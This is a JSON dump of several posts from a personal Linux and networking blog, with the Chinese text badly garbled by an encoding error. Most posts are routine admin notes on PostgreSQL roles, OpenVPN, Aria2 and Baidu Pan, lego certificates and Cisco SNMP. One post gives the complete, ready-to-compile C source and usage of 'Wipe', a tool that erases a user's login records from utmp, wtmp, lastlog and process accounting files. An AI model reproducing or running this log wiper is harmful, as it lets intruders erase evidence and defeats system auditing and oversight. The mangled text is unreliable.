TO test_project; 28 29#å»ºç«‹è§’è‰²ï¼ŒæŠŠè§’è‰²ç»„çš„æƒé™ç»™è§’è‰²ï¼Œå°±æå®šäº† 30CREATE ROLE test LOGIN PASSWORD \u0026#39;lankutest\u0026#39;; 31GRANT test_project TO test; è¡¥å……ï¼š\nPUBLIC å’Œ publicï¼ˆæœªåŠ å¼•å·ï¼‰æ˜¯ç­‰ä»·çš„ï¼Œåœ¨ PostgreSQL ä¸Šå¤§å°å†™ä¸æ•æ„Ÿã€‚ \u0026quot;PUBLIC\u0026quot;ï¼ˆåŠ åŒå¼•å·ï¼‰ä¼šè¢«çœ‹ä½œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œé PostgreSQL é¢„å®šä¹‰çš„ PUBLIC è§’è‰²ã€‚ PUBLIC æ˜¯ PostgreSQL çš„ç‰¹æ®Šä¿ç•™è§’è‰²ï¼Œä»£è¡¨æ‰€æœ‰ç”¨æˆ·ï¼Œä¸èƒ½ç›´æ¥åˆ›å»ºæˆ–ç®¡ç†ï¼Œä¹Ÿä¸ä¼šå‡ºç°åœ¨ pg_roles ä¸­ã€‚ ","date":"2024-02-05","img":"","permalink":"https://rendoumi.com/posts/20240205-postgres_user_manager/","series":null,"tags":null,"title":"PostgreSQLçš„ç”¨æˆ·æƒé™ç®¡ç†"},{"categories":null,"content":"ä¸€äº›Openvpné—®é¢˜ï¼š\nä¸€ã€OpenVPN - ERROR: Cannot open TUN/TAP dev /dev/net/tun: No such file or directory (errno=2)\næ²¡æœ‰tunè®¾å¤‡ï¼Œå»ºä¸€ä¸ªå°±è¡Œï¼š\n1mkdir -p /dev/net 2mknod /dev/net/tun c 10 200 3chmod 600 /dev/net/tun äºŒã€vpnè¿›ç¨‹æ‰äº†\nåŠ ä¸€ä¸ªcrontabï¼Œå®šæ—¶æ£€æµ‹ï¼Œæ²¡æœ‰å°±é‡å¯\n1*/1 * * * * /usr/local/bin/vpn.sh 2 3cat /usr/local/bin/vpn.cn 4#!/bin/bash 5vpn_pid=$(ps ax|grep openvpn|grep -v grep|awk \u0026#39;{print $1}\u0026#39;) 6if [[ ! -n \u0026#34;$vpn_pid\u0026#34; ]]; then 7 datetime=$(date +\u0026#34;%Y%m%d %H:%M:%S\u0026#34;) 8 echo \u0026#34;Restart openvpn at $datetime\u0026#34; \u0026gt;\u0026gt; /tmp/r.txt 9 sleep 5 10 /app/openvpn/sbin/openvpn --config /etc/openvpn/conf/client1.conf --daemon 11fi ","date":"2024-01-30","img":"","permalink":"https://rendoumi.com/posts/20240130-openvpn_problem/","series":null,"tags":null,"title":"Openvpn çš„ä¸€äº›é—®é¢˜"},{"categories":null,"content":"Linuxä¸‹çš„æ—¥å¿—æ“¦é™¤è½¯ä»¶ï¼Œæ— è§£é‡Šçè—ï¼š\n1gcc -O3 -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c 2 3wipe u root #w å‘½ä»¤æ“¦æ‰åœ¨çº¿çš„root 4wipe w root #last å‘½ä»¤æ“¦æ‰root 5wipe l root #lastlog å‘½ä»¤æ“¦æ‰rootç™»å½•è®°å½• æºç å¦‚ä¸‹ï¼š\n1/* 2 * Wipe v1.00. 3 * 4 * Written by The Crawler. 5 * 6 * Selectively wipe system logs. 7 * 8 * Usage: wipe [l,u,w] username 9 * ex: wipe l user;wipe u user;wipe w user 10 * 11 * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x, 12 * Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX. 13 * compile with -DHAVE_LASTLOG_H -DNO_ACCT */ 14 15#include \u0026lt;sys/types.h\u0026gt; 16#include \u0026lt;sys/stat.h\u0026gt; 17#include \u0026lt;sys/uio.h\u0026gt; 18#ifndef NO_ACCT 19#include \u0026lt;sys/acct.h\u0026gt; 20#endif 21#include \u0026lt;utmp.h\u0026gt; 22#include \u0026lt;fcntl.h\u0026gt; 23#include \u0026lt;unistd.h\u0026gt; 24#include \u0026lt;stdio.h\u0026gt; 25#include \u0026lt;ctype.h\u0026gt; 26#include \u0026lt;string.h\u0026gt; 27#include \u0026lt;pwd.h\u0026gt; 28#include \u0026lt;time.h\u0026gt; 29#include \u0026lt;stdlib.h\u0026gt; 30 31#ifdef HAVE_LASTLOG_H 32#include \u0026lt;lastlog.h\u0026gt; 33#endif 34 35#ifdef HAVE_UTMPX 36#include \u0026lt;utmpx.h\u0026gt; 37#endif 38 39/* 40 * Try to use the paths out of the include files. 41 * But if we can\u0026#39;t find any, revert to the defaults. 42 */ 43#ifndef UTMP_FILE 44#ifdef _PATH_UTMP 45#define UTMP_FILE\t_PATH_UTMP 46#else 47#define UTMP_FILE\t\u0026#34;/var/adm/utmp\u0026#34; 48#endif 49#endif 50 51#ifndef WTMP_FILE 52#ifdef _PATH_WTMP 53#define WTMP_FILE\t_PATH_WTMP 54#else 55#define WTMP_FILE\t\u0026#34;/var/adm/wtmp\u0026#34; 56#endif 57#endif 58 59#ifndef LASTLOG_FILE 60#ifdef _PATH_LASTLOG 61#define LASTLOG_FILE\t_PATH_LASTLOG 62#else 63#define LASTLOG_FILE\t\u0026#34;/var/adm/lastlog\u0026#34; 64#endif 65#endif 66 67#ifndef ACCT_FILE 68#define ACCT_FILE\t\u0026#34;/var/adm/pacct\u0026#34; 69#endif 70 71#ifdef HAVE_UTMPX 72 73#ifndef UTMPX_FILE 74#define UTMPX_FILE\t\u0026#34;/var/adm/utmpx\u0026#34; 75#endif 76 77#ifndef WTMPX_FILE 78#define WTMPX_FILE\t\u0026#34;/var/adm/wtmpx\u0026#34; 79#endif 80 81#endif /* HAVE_UTMPX */ 82 83#define BUFFSIZE\t8192 84 85 86/* 87 * This function will copy the src file to the dst file. 88 */ 89void 90copy_file(char *src, char *dst) 91{ 92\tint fd1, fd2; 93\tint\tn; 94\tchar\tbuf[BUFFSIZE]; 95 96\tif ( (fd1 = open(src, O_RDONLY)) \u0026lt; 0 ) { 97\tfprintf(stderr, \u0026#34;ERROR: Opening %s during copy.\\n\u0026#34;, src); 98\treturn; 99\t} 100 101\tif ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) \u0026lt; 0 ) { 102\tfprintf(stderr, \u0026#34;ERROR: Creating %s during copy.\\n\u0026#34;, dst); 103\treturn; 104\t} 105\t106\twhile ( (n = read(fd1, buf, BUFFSIZE)) \u0026gt; 0) 107\tif (write(fd2, buf, n) != n) { 108\tfprintf(stderr, \u0026#34;ERROR: Write error during copy.\\n\u0026#34;); 109\treturn; 110\t} 111\t112\tif (n \u0026lt; 0) { 113\tfprintf(stderr, \u0026#34;ERROR: Read error during copy.\\n\u0026#34;); 114\treturn; 115\t} 116 117\tclose(fd1); 118\tclose(fd2); 119} 120 121 122/* 123 * UTMP editing. 124 */ 125void 126wipe_utmp(char *who, char *line) 127{ 128\tint fd1; 129\tstruct utmp\tut; 130\t131\tprintf(\u0026#34;Patching %s .... \u0026#34;, UTMP_FILE); 132\tfflush(stdout); 133 134\t/* 135\t* Open the utmp file. 136\t*/ 137\tif ( (fd1 = open(UTMP_FILE, O_RDWR)) \u0026lt; 0 ) { 138\tfprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, UTMP_FILE); 139\treturn; 140\t} 141\t142\t/* 143\t* Copy utmp file excluding relevent entries. 144\t*/\t145\twhile ( read(fd1, \u0026amp;ut, sizeof(ut)) \u0026gt; 0) 146\tif ( !strncmp(ut.ut_name, who, strlen(who)) ) 147\tif (!line || (line \u0026amp;\u0026amp; 148\t!strncmp(ut.ut_line, line, strlen(line)))) { 149\tbzero((char *) \u0026amp;ut, sizeof(ut)); 150\tlseek(fd1, (int) -sizeof(ut), SEEK_CUR); 151\twrite(fd1, \u0026amp;ut, sizeof(ut)); 152\t} 153 154\tclose(fd1); 155 156\tprintf(\u0026#34;Done.\\n\u0026#34;); 157} 158 159/* 160 * UTMPX editing if supported. 161 */ 162#ifdef HAVE_UTMPX 163void 164wipe_utmpx(char *who, char *line) 165{ 166\tint fd1; 167\tstruct utmpx\tutx; 168 169\tprintf(\u0026#34;Patching %s .... \u0026#34;, UTMPX_FILE); 170\tfflush(stdout); 171\t172\t/* 173\t* Open the utmp file and temporary file. 174\t*/ 175\tif ( (fd1 = open(UTMPX_FILE, O_RDWR)) \u0026lt; 0 ) { 176\tfprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, UTMPX_FILE); 177\treturn; 178\t} 179 180\twhile ( (read(fd1, \u0026amp;utx, sizeof(utx)) ) \u0026gt; 0) 181\tif ( !strncmp(utx.ut_name, who, strlen(who)) ) 182\tif (!line || (line \u0026amp;\u0026amp; 183\t!strncmp(utx.ut_line, line, strlen(line)))) { 184\tbzero((char *) \u0026amp;utx, sizeof(utx)); 185\tlseek(fd1, (int) -sizeof(utx), SEEK_CUR); 186\twrite(fd1, \u0026amp;utx, sizeof(utx)); 187\t} 188 189\tclose(fd1); 190 191\tprintf(\u0026#34;Done.\\n\u0026#34;); 192} 193#endif 194 195 196/* 197 * WTMP editing. 198 */ 199void 200wipe_wtmp(char *who, char *line) 201{ 202\tint\tfd1; 203\tstruct utmp\tut; 204 205\tprintf(\u0026#34;Patching %s .... \u0026#34;, WTMP_FILE); 206\tfflush(stdout); 207\t208 /* 209\t* Open the wtmp file and temporary file. 210\t*/ 211\tif ( (fd1 = open(WTMP_FILE, O_RDWR)) \u0026lt; 0 ) { 212\tfprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, WTMP_FILE); 213\treturn; 214\t} 215 216\t/* 217\t* Determine offset of last relevent entry. 218\t*/ 219\tlseek(fd1, (long) -(sizeof(ut)), SEEK_END); 220\twhile ( (read (fd1, \u0026amp;ut, sizeof(ut))) \u0026gt; 0) { 221\tif (!strncmp(ut.ut_name, who, strlen(who))) 222\tif (!line || (line \u0026amp;\u0026amp; 223\t!strncmp(ut.ut_line, line, strlen(line)))) { 224\tbzero((char *) \u0026amp;ut, sizeof(ut)); 225\tlseek(fd1, (long) -(sizeof(ut)), SEEK_CUR); 226\twrite(fd1, \u0026amp;ut, sizeof(ut)); 227\tbreak; 228\t} 229\tlseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR); 230\t} 231 232\tclose(fd1); 233\t234\tprintf(\u0026#34;Done.\\n\u0026#34;); 235} 236 237 238/* 239 * WTMPX editing if supported. 240 */ 241#ifdef HAVE_UTMPX 242void 243wipe_wtmpx(char *who, char *line) 244{ 245\tint fd1; 246\tstruct utmpx\tutx; 247\t248\tprintf(\u0026#34;Patching %s .... \u0026#34;, WTMPX_FILE); 249\tfflush(stdout); 250\t251\t/* 252\t* Open the utmp file and temporary file. 253\t*/ 254\tif ( (fd1 = open(WTMPX_FILE, O_RDWR)) \u0026lt; 0 ) { 255\tfprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, WTMPX_FILE); 256\treturn; 257\t} 258 259\t/* 260\t* Determine offset of last relevent entry. 261\t*/ 262\tlseek(fd1, (long) -(sizeof(utx)), SEEK_END); 263\twhile ( (read (fd1, \u0026amp;utx, sizeof(utx))) \u0026gt; 0) { 264\tif (!strncmp(utx.ut_name, who, strlen(who))) 265\tif (!line || (line \u0026amp;\u0026amp; 266\t!strncmp(utx.ut_line, line, strlen(line)))) { 267\tbzero((char *) \u0026amp;utx, sizeof(utx)); 268\tlseek(fd1, (long) -(sizeof(utx)), SEEK_CUR); 269\twrite(fd1, \u0026amp;utx, sizeof(utx)); 270\tbreak; 271\t} 272\tlseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR); 273\t} 274 275\tclose(fd1); 276 277\tprintf(\u0026#34;Done.\\n\u0026#34;); 278} 279#endif 280 281 282/* 283 * LASTLOG editing. 284 */ 285void 286wipe_lastlog(char *who, char *line, char *timestr, char *host) 287{ 288\tint\tfd1; 289\tstruct lastlog\tll; 290\tstruct passwd\t*pwd; 291\tstruct tm\t*tm; 292\tchar\tstr[4]; 293 294\tprintf(\u0026#34;Patching %s .... \u0026#34;, LASTLOG_FILE); 295\tfflush(stdout); 296 297\ttm = (struct tm *) malloc( sizeof(struct tm) ); 298\t299 /* 300\t* Open the lastlog file. 301\t*/ 302\tif ( (fd1 = open(LASTLOG_FILE, O_RDWR)) \u0026lt; 0 ) { 303\tfprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, LASTLOG_FILE); 304\treturn; 305\t} 306 307\tif ( (pwd = getpwnam(who)) == NULL) { 308\tfprintf(stderr, \u0026#34;ERROR: Can\u0026#39;t find user in passwd.\\n\u0026#34;); 309\treturn; 310\t} 311\t312\tlseek(fd1, (long) pwd-\u0026gt;pw_uid * sizeof(struct lastlog), 0); 313\tbzero((char *) \u0026amp;ll, sizeof(ll)); 314 315\tif (line) 316\tstrncpy(ll.ll_line, line, strlen(line)); 317 318\tif (timestr) { 319\t/* YYMMddhhmm */ 320\tif (strlen(timestr) != 10) { 321\tfprintf(stderr, \u0026#34;ERROR: Time format is YYMMddhhmm.\\n\u0026#34;); 322\treturn; 323\t} 324\t325\t/* 326\t* Extract Times. 327\t*/ 328\tstr[2] = 0; 329\tstr[0] = timestr[0]; 330\tstr[1] = timestr[1]; 331\ttm-\u0026gt;tm_year = atoi(str); 332\t333\tstr[0] = timestr[2]; 334\tstr[1] = timestr[3]; 335\ttm-\u0026gt;tm_mon = atoi(str) - 1; 336\t337\tstr[0] = timestr[4]; 338\tstr[1] = timestr[5]; 339\ttm-\u0026gt;tm_mday = atoi(str); 340\t341\tstr[0] = timestr[6]; 342\tstr[1] = timestr[7]; 343\ttm-\u0026gt;tm_hour = atoi(str); 344\t345\tstr[0] = timestr[8]; 346\tstr[1] = timestr[9]; 347\ttm-\u0026gt;tm_min = atoi(str); 348\ttm-\u0026gt;tm_sec = 0; 349\t350\tll.ll_time = mktime(tm); 351\t} 352 353\tif (host) 354\tstrncpy(ll.ll_host, host, sizeof(ll.ll_host)); 355\t356 357\twrite(fd1, (char *) \u0026amp;ll, sizeof(ll)); 358 359\tclose(fd1); 360 361\tprintf(\u0026#34;Done.\\n\u0026#34;); 362} 363 364 365#ifndef NO_ACCT 366/* 367 * ACCOUNT editing. 368 */ 369void 370wipe_acct(char *who, char *line) 371{ 372\tint\tfd1, fd2; 373\tstruct acct\tac; 374\tchar\tttyn[50]; 375\tstruct passwd *pwd; 376\tstruct stat\tsbuf; 377\tchar\t*tmpf; 378\t379\tprintf(\u0026#34;Patching %s .... \u0026#34;, ACCT_FILE); 380\tfflush(stdout); 381 382 /* 383\t* Open the acct file and temporary file. 384\t*/ 385\tif ( (fd1 = open(ACCT_FILE, O_RDONLY)) \u0026lt; 0 ) { 386\tfprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, ACCT_FILE); 387\treturn; 388\t} 389 390\t/* 391\t* Grab a unique temporary filename. 392\t*/ 393\ttmpf = tmpnam((char *) NULL); 394 395\tif ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) \u0026lt; 0 ) { 396\tfprintf(stderr, \u0026#34;ERROR: Opening tmp ACCT file\\n\u0026#34;); 397\treturn; 398\t} 399 400\tif ( (pwd = getpwnam(who)) == NULL) { 401\tfprintf(stderr, \u0026#34;ERROR: Can\u0026#39;t find user in passwd.\\n\u0026#34;); 402\treturn; 403\t} 404 405\t/* 406\t* Determine tty\u0026#39;s device number 407\t*/ 408\tstrcpy(ttyn, \u0026#34;/dev/\u0026#34;); 409\tstrcat(ttyn, line); 410\tif (stat(ttyn, \u0026amp;sbuf) \u0026lt; 0) { 411\tfprintf(stderr, \u0026#34;ERROR: Determining tty device number.\\n\u0026#34;); 412\treturn; 413\t} 414\t415\twhile ( read(fd1, \u0026amp;ac, sizeof(ac)) \u0026gt; 0 ) { 416\tif ( !(ac.ac_uid == pwd-\u0026gt;pw_uid \u0026amp;\u0026amp; ac.ac_tty == sbuf.st_rdev) )\t417\twrite(fd2, \u0026amp;ac, sizeof(ac)); 418\t} 419 420\tclose(fd1); 421\tclose(fd2); 422\t423\tcopy_file(tmpf, ACCT_FILE); 424\t425\tif ( unlink(tmpf) \u0026lt; 0 ) { 426\tfprintf(stderr, \u0026#34;ERROR: Unlinking tmp WTMP file.\\n\u0026#34;); 427\treturn; 428\t} 429 430\tprintf(\u0026#34;Done.\\n\u0026#34;); 431} 432#endif 433 434 435void 436usage() 437{ 438\tprintf(\u0026#34;USAGE: wipe [ u|w|l|a ] ...options...\\n\u0026#34;); 439\tprintf(\u0026#34;\\n\u0026#34;); 440\tprintf(\u0026#34;UTMP editing:\\n\u0026#34;); 441\tprintf(\u0026#34; Erase all usernames : wipe u [username]\\n\u0026#34;); 442\tprintf(\u0026#34; Erase one username on tty: wipe u [username] [tty]\\n\u0026#34;); 443\tprintf(\u0026#34;\\n\u0026#34;); 444\tprintf(\u0026#34;WTMP editing:\\n\u0026#34;); 445\tprintf(\u0026#34; Erase last entry for user : wipe w [username]\\n\u0026#34;); 446\tprintf(\u0026#34; Erase last entry on tty : wipe w [username] [tty]\\n\u0026#34;); 447\tprintf(\u0026#34;\\n\u0026#34;);\t448\tprintf(\u0026#34;LASTLOG editing:\\n\u0026#34;); 449\tprintf(\u0026#34; Blank lastlog for user : wipe l [username]\\n\u0026#34;); 450\tprintf(\u0026#34; Alter lastlog entry : wipe l [username] [tty] [time] [host]\\n\u0026#34;); 451\tprintf(\u0026#34;\tWhere [time] is in the format [YYMMddhhmm]\\n\u0026#34;); 452\tprintf(\u0026#34;\\n\u0026#34;); 453#ifndef NO_ACCT 454\tprintf(\u0026#34;ACCT editing:\\n\u0026#34;); 455\tprintf(\u0026#34; Erase acct entries on tty : wipe a [username] [tty]\\n\u0026#34;); 456#endif 457\texit(1); 458} 459 460 461int 462main(int argc, char *argv[]) 463{ 464\tchar\tc; 465\t466\tif (argc \u0026lt; 3) 467\tusage(); 468 469\t/* 470\t* First character of first argument determines which file to edit. 471\t*/ 472\tc = toupper(argv[1][0]); 473\t474\t/* 475\t* UTMP editing. 476\t*/ 477\tswitch (c) { 478\t/* UTMP */ 479\tcase \u0026#39;U\u0026#39; : 480\tif (argc == 3) 481\twipe_utmp(argv[2], (char *) NULL); 482\tif (argc ==4) 483\twipe_utmp(argv[2], argv[3]); 484\t485#ifdef HAVE_UTMPX 486\tif (argc == 3) 487\twipe_utmpx(argv[2], (char *) NULL); 488\tif (argc == 4) 489\twipe_utmpx(argv[2], argv[3]); 490#endif 491\t492\tbreak; 493\t/* WTMP */ 494\tcase \u0026#39;W\u0026#39; : 495\tif (argc == 3) 496\twipe_wtmp(argv[2], (char *) NULL); 497\tif (argc == 4) 498\twipe_wtmp(argv[2], argv[3]); 499\t500#ifdef HAVE_UTMPX 501\tif (argc == 3) 502\twipe_wtmpx(argv[2], (char *) NULL); 503\tif (argc == 4) 504\twipe_wtmpx(argv[2], argv[3]); 505#endif 506\t507\tbreak; 508\t/* LASTLOG */ 509\tcase \u0026#39;L\u0026#39; : 510\tif (argc == 3) 511\twipe_lastlog(argv[2], (char *) NULL, 512\t(char *) NULL, (char *) NULL); 513\tif (argc == 4) 514\twipe_lastlog(argv[2], argv[3], (char *) NULL, 515\t(char *) NULL); 516\tif (argc == 5) 517\twipe_lastlog(argv[2], argv[3], argv[4], 518\t(char *) NULL); 519\tif (argc == 6) 520\twipe_lastlog(argv[2], argv[3], argv[4], 521\targv[5]); 522\tbreak; 523#ifndef NO_ACCT 524\t/* ACCT */ 525\tcase \u0026#39;A\u0026#39; : 526\tif (argc != 4) 527\tusage(); 528\twipe_acct(argv[2], argv[3]); 529\tbreak; 530#endif 531\t} 532 533\treturn(0); 534} ","date":"2024-01-29","img":"","permalink":"https://rendoumi.com/posts/20240129-wipe_linux/","series":null,"tags":null,"title":"Linuxä¸‹çš„æ“¦é™¤å·¥å…·"},{"categories":null,"content":"å—ç“œè§†é¢‘æœ€è¿‘è¢«æ•´æ”¹ï¼Œä¸€æ—¶é™·å…¥ç‰‡è’ã€‚\nå®¶é‡Œçš„ç”µè§†æœºå¥½ä¸å®¹æ˜“ç¦æ­¢å‡çº§ï¼Œèƒ½ç”¨ESæµè§ˆå™¨ï¼ŒæŒ‚ä¸Šç™¾åº¦ç½‘ç›˜ï¼Œçœ‹å­˜åœ¨é‡Œé¢çš„ç”µå½±ã€‚\nä½†æ˜¯ï¼Œç™¾åº¦ç½‘ç›˜ç°åœ¨åŸºæœ¬æ˜¯ç£åŠ›å’ŒBTéƒ½å¤±æ•ˆäº†ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½æƒ³ä¸ªåŠæ³•çœ‹æ€ä¹ˆä¸‹è½½å¹¶ä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜äº†ã€‚\nä¸€ã€Aria2ï¼Œç”¨æ¥ä¸‹è½½BTå’Œç£åŠ›æ–‡ä»¶ã€‚ å®‰è£…Aria2ï¼Œè¿™ä¸ªéå¸¸ç®€å•ï¼Œå°±ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶å’Œä¸€å †é…ç½®æ–‡ä»¶å°±è¡Œäº†ã€‚\n1wget https://github.com/P3TERX/Aria2-Pro-Core/releases/download/1.35.0_2021.02.19/aria2-1.35.0-static-linux-amd64.tar.gz 2tar zxvf aria2-1.35.0-static-linux-amd64.tar.gz 3 4mkdir /root/.aria2 5cd /root/.aria2 6wget https://p3terx.github.io/aria2.conf/aria2.conf 7wget https://p3terx.github.io/aria2.conf/clean.sh 8wget https://p3terx.github.io/aria2.conf/core 9wget https://p3terx.github.io/aria2.conf/script.conf 10wget https://p3terx.github.io/aria2.conf/rclone.env 11wget https://p3terx.github.io/aria2.conf/upload.sh 12wget https://p3terx.github.io/aria2.conf/delete.sh 13wget https://p3terx.github.io/aria2.conf/dht.dat 14wget https://p3terx.github.io/aria2.conf/dht6.dat 15wget https://p3terx.github.io/aria2.conf/move.sh 16wget https://p3terx.github.io/aria2.conf/LICENSE 17touch aria2.session æ³¨æ„è¿™é‡Œæ˜¯rootç”¨æˆ·è¿è¡Œï¼Œå¦‚æœè¦ç”¨å…¶ä»–ç”¨æˆ·ï¼Œä¿®æ”¹/root/.aria2/aria2.confé‡Œé¢çš„/rootå°±è¡Œã€‚\nç„¶åå†é€ ä¸ªsystemctlçš„å¯åŠ¨æ§åˆ¶æ–‡ä»¶ï¼š\n1cat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/systemd/system/aria2.service 2[Unit] 3Description=aria2 Service 4After=network.target 5Wants=network.target 6 7[Service] 8Type=simple 9ExecStart=/root/aria2c --conf-path=/root/.aria2/aria2.conf 10Restart=on-failure 11# Don\u0026#39;t restart in the case of configuration error 12RestartPreventExitStatus=23 13 14[Install] 15WantedBy=multi-user.target 16EOF 17 18systemctl daemon-reload 19systemctl start aria2 æ³¨æ„ï¼Œå¦‚æœæœ‰é˜²ç«å¢™ï¼Œæ³¨æ„æ‰“å¼€ä»¥ä¸‹ä¸‰ä¸ªç«¯å£ã€‚\n1tcp 6800 2tcp 51413 3udp 51413 ç„¶åå°±å¥½äº†ï¼Œç„¶è€Œä½†æ˜¯ï¼Œæ²¡æœ‰ä»»ä½•å¯ç”¨ç•Œé¢\næˆ‘ä»¬å¼„ä¸ªç•Œé¢å§ï¼ŒAriaNGï¼Œå…¶å®å°±éœ€è¦ä¸€ä¸ªæ–‡ä»¶ï¼Œindex.html\n1wget https://github.com/mayswind/AriaNg/releases/download/1.2.1/AriaNg-1.2.1-AllInOne.zip éšä¾¿æ”¾åˆ°ä¸ªwebæœåŠ¡å™¨ä¸Šï¼Œç„¶åæ‰“å¼€é…ç½®ä¸€ä¸‹\nç„¶åå°±èƒ½éšä¾¿å»ä¸‹è½½ç£åŠ›é“¾å’ŒBTäº†ã€‚\nç„¶åå‘¢ï¼Œæ€ä¹ˆä¼ åˆ°ç™¾åº¦äº‘ç›˜å»å‘¢ï¼Ÿ\nç»§ç»­ï¼Œç”¨BaiduPCS-Go\n1wget https://github.com/qjfoidnh/BaiduPCS-Go/releases/download/v3.7.9/BaiduPCS-Go-v3.7.9-linux-amd64.zip ç„¶åç”¨æµè§ˆå™¨æ‰“å¼€pan.baidu.comï¼ŒF12è°ƒè¯•ï¼Œæ‹¿åˆ°Cookieä¸­çš„BDUSSå€¼\nå…ˆç™»å½•\n1./BaiduPCS-Go login -bduss=xxxx ç„¶åå°±å¯ä»¥ä¸Šä¼ äº†ï¼Œæ³¨æ„ï¼Œå¦‚æœä¸Šä¼ çš„ç›®å½•ååé¢å¸¦/ç»“å°¾ï¼Œé‚£ä¼šæŠŠç›®å½•ä¸‹çš„ä¸œè¥¿ä¼ ä¸Šå»ï¼Œå¦‚æœä¸å¸¦/ç»“å°¾ï¼Œå°±ä¸Šä¼ æ•´ä¸ªç›®å½•ï¼Œè·Ÿrsyncçš„ç”¨æ³•ä¸€æ ·ï¼ˆå¾ˆä¸é”™ï¼‰ï¼Œç„¶åå»ç™¾åº¦ç½‘ç›˜çš„ç›®å½•moviesä¸‹å°±å¯ä»¥çœ‹åˆ°æ–‡ä»¶äº†ã€‚\nåŸºæœ¬ä¸Šæ˜¯ç§’ä¼ ï¼Œå› ä¸ºä½ ä¸‹çš„ä¸œè¥¿99%çš„æœºç‡ç™¾åº¦å·²ç»æœ‰äº†ï¼š\n1./BaiduPCS-Go u çˆ±ï¼Œæ­»äº¡å’Œæœºå™¨äºº.Love.Death.and.Robots.S02 movies ç„¶åæ‰“å¼€ç”µè§†æœºä¸Šçš„ç™¾åº¦ç½‘ç›˜ï¼Œå°±å¯ä»¥è‡ªç”±è§‚çœ‹äº†ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-aria2_baidu/","series":null,"tags":null,"title":"Aria2ä¸‹è½½ç½‘å‰§å¹¶æé€Ÿä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜"},{"categories":null,"content":"amceç”³è¯·è¯ä¹¦å®åœ¨æ˜¯å¤ªçƒ¦äº†ï¼Œå¯¹äºä¸€å°åªæœ‰1cpu 512mçš„vpsæ¥è¯´ï¼Œè£…è¿™ä¸ªä¸œè¥¿ç®€ç›´å°±æ˜¯è´¹æ—¶è´¹åŠ²ã€‚\nå¥½åœ¨æœ‰äººå¹²è„†å¼€å‘äº†ä¸€ä¸ªgoè¯­è¨€çš„å·¥å…·legoï¼Œè¿™ä¸œè¥¿å®Œå…¨èƒ½å¤Ÿæ›¿ä»£æ‰ACME\n1https://github.com/go-acme/lego/ åªæœ‰ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œæç®€ä¸»ä¹‰ï¼š\nç”³è¯·è¯ä¹¦ä¸€å¥è¯ï¼š\n1 lego --email=\u0026#34;foo@bar.com\u0026#34; --domains=\u0026#34;example.com\u0026#34; --http run å›ç­”ä¸€ä¸‹Yes\nç„¶åç”Ÿæˆçš„è¯ä¹¦éƒ½æ”¾åœ¨.lego/certificates/ç›®å½•ä¸‹\nç»­è´¹ä¹Ÿæ˜¯ä¸€å¥è¯\n1 lego --email=\u0026#34;foo@bar.com\u0026#34; --domains=\u0026#34;example.com\u0026#34; --http renew åŠå…¶ç®€å•ï¼Œä¹Ÿæ–¹ä¾¿æ¬è¿ã€‚ç”Ÿæˆçš„è¯ä¹¦crtæ˜¯å¸¦è¯ä¹¦é“¾æ¡çš„\nç”³è¯·å¥½å°±å¯ä»¥è£…trojanäº†ã€‚å®åœ¨æ˜¯æ–¹ä¾¿\nå¦‚æœDNSæ˜¯æ‰˜ç®¡åœ¨é˜¿é‡Œäº‘ä¸Šï¼Œå¯ä»¥å¼€ä¸€ä¸ªé˜¿é‡Œramè´¦å·ï¼Œç„¶åç”¨dnsçš„apiéªŒè¯\n1ALICLOUD_ACCESS_KEY=aaaaaaaa ALICLOUD_SECRET_KEY=bbbbbbbb \\ 2./lego --email admin@ddky.com --dns alidns --domains *.ddky.com run å¦‚æœDNSæ˜¯æ‰˜ç®¡åœ¨namesiloä¸Šï¼ŒåŒæ ·å¯ä»¥å¼€ä¸€ä¸ªapiçš„keyï¼Œæ—¶é—´ä¸€å®šè¦æ”¾é•¿ï¼Œå¦åˆ™ä¸ç”Ÿæ•ˆï¼\n1NAMESILO_API_KEY=ccccc NAMESILO_PROPAGATION_TIMEOUT=3600 NAMESILO_POLLING_INTERVAL=120 NAMESILO_TTL=3600 \\ 2./lego --email zhangranrui@gmail.com --dns namesilo --domains *.rendoumi.com run ","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-lego_acme/","series":null,"tags":null,"title":"ç”¨legoæ¥ä»£æ›¿acmeç”³è¯·å…è´¹sslè¯ä¹¦"},{"categories":null,"content":"https://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html è¿™ç¯‡è¯´çš„å¾ˆè¯¦ç»†äº†\næŒ‰å›¾ç´¢éª¥å³å¯\nsnmpwalk v3å‚æ•°è§£é‡Šï¼š\n1-v 1|2c|3 specifies SNMP version to use 2-u USER-NAME set security name (e.g. bert) 3-l LEVEL set security level (noAuthNoPriv|authNoPriv|authPriv) 4-a PROTOCOL set authentication protocol (MD5|SHA) 5-A PASSPHRASE set authentication protocol pass phrase 6-x PROTOCOL set privacy protocol (DES|AES) 7-X PASSPHRASE set privacy protocol pass phrase ç®€å•è¯´ï¼Œv3æ”¯æŒä¸¤é‡åŠ å¯†ï¼Œè¦è¾“å…¥ä¸¤ä¸ªå¯†ç \n1snmpset -v3 -u Cisco -l authPriv -a MD5 -A FuckCisco -x DES -X zhenbushidongxi 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2 